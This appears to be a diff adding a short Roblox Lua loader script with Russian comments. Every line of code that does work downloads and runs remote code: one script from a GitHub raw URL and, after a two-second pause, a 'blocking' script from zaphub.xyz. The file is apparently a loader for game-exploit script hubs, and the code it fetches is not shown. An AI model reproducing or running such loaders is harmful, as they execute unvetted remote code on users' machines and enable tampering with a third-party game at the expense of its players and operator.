@@ -1,0 +1,8 @@
+-- Сначала запускаем фон (GitHub) скрипт
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ODHUBytb/All-need-xx-script-veshi/refs/heads/main/x%20script%20base%20no%20deleting"))()
+
+-- Ждём 2 секунды (дай скрипту выполниться)
+wait(2)
+
+-- Потом запускаем блокирующий скрипт
+loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
